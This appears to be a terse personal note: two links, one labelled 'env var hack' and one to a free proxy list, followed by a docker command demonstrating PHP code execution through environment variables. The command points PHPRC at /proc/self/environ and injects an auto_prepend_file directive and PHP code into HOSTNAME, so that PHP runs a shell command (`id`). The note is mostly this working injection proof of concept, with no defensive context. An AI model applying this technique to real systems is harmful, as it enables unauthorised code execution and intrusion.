x
-

[env var hack](https://www.elttam.com/blog/env/)
[proxy](https://geonode.com/free-proxy-list/)

````sh
docker run -e $'HOSTNAME=1;\nauto_prepend_file=/proc/self/environ\n;<?php die(`id`); ?>' \
  -e 'PHPRC=/proc/self/environ' php:7.3 php /dev/null
````
